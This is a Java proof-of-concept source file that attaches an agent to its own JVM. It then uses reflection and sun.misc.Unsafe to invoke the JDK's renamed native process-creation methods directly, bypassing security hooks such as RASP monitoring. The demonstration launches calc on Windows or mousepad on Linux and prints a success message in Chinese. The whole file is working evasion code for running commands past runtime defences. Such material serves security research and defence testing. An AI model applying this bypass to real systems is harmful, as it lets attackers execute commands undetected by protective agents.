package Hook._native;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;

public class _ByPass1 {
    public static void main(String[] args) throws Exception{
        String path = "./src/main/java/Hook/_native/jars/agentmain.jar";
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor v:list){
            if (v.displayName().contains("_ByPass1")){
                VirtualMachine vm = VirtualMachine.attach(v.id());
                vm.loadAgent(path);
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    bypass_hook_windows("calc");
                } else {
                    bypass_hook_linux("mousepad");
                }
                vm.detach();
            }
        }
    }

    public static void bypass_hook_windows(String cmd) throws Exception{
        Class processClass = Class.forName("java.lang.ProcessImpl");

        String cmdstr = cmd;
        String envblock = null;
        String dir = null;
        long[] stdHandles = new long[]{-1, -1, -1};
        // 这里将 redirectErrorStream 设置为 true 以便于将错误输出重定向到标准输出
        boolean redirectErrorStream = true;
        boolean flag = true;
        for (Method method : processClass.getDeclaredMethods()) {
            if (method.getName().endsWith("create") && !method.getName().equals("create")) {
                System.out.println("修改后的方法名为："+method.getName()+", 绕过成功！");
                method.setAccessible(true);
                method.invoke(null, cmdstr, envblock, dir, stdHandles, redirectErrorStream);
                flag = false;
            }
        }
        if (flag){
            Method create = processClass.getDeclaredMethod("create", String.class, String.class, String.class, long[].class, boolean.class);
            create.setAccessible(true);
            create.invoke(null, cmdstr, envblock, dir, stdHandles, redirectErrorStream);
        }
    }
    public static void bypass_hook_linux(String cmd) throws Exception {
        Class processClass = null;
        try {
            processClass = Class.forName("java.lang.UNIXProcess");
        } catch (ClassNotFoundException e) {
            processClass = Class.forName("java.lang.ProcessImpl");
        }

        Object processObject = unsafe_getObject(processClass);
        Object launchMechanism = getFieldValue(processObject, "launchMechanism");
        int ordinal = ((int) launchMechanism.getClass().getMethod("ordinal").invoke(launchMechanism)) + 1;
        byte[] helperpath = getFieldValue(processObject, "helperpath");
        byte[] prog = new byte[cmd.getBytes().length + 1];
        System.arraycopy(cmd.getBytes(), 0, prog, 0, cmd.getBytes().length);
        byte[] argBlock = new byte[]{};
        int argc = 0;
        byte[] envBlock = null;
        int envc = 0;
        byte[] dir = null;
        int[] fds = new int[]{-1, -1, -1};
        boolean redirectErrorStream = true;
        boolean flag = true;


        for (Method method : processClass.getDeclaredMethods()) {
            if (method.getName().endsWith("forkAndExec") && !method.getName().equals("forkAndExec")) {
                System.out.println("修改后的方法名为："+method.getName()+", 绕过成功！");
                method.setAccessible(true);
                method.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,
                        envBlock, envc, dir, fds, redirectErrorStream);
                flag = false;
            }
        }

        if (flag){
            Method forkAndExecMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class,
                    byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class);
            forkAndExecMethod.setAccessible(true);
            forkAndExecMethod.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,
                    envBlock, envc, dir, fds, redirectErrorStream);
        }

    }

    private static <T> T unsafe_getObject(Class<? super T> objectClass) throws Exception {
        Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        return (T) ((Unsafe) unsafeField.get(null)).allocateInstance(objectClass);
    }

    public static <T> T getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return (T) field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if (field != null)
                field.setAccessible(true);
            else if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        } catch (NoSuchFieldException e) {
            if (!clazz.getSuperclass().equals(Object.class)) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
}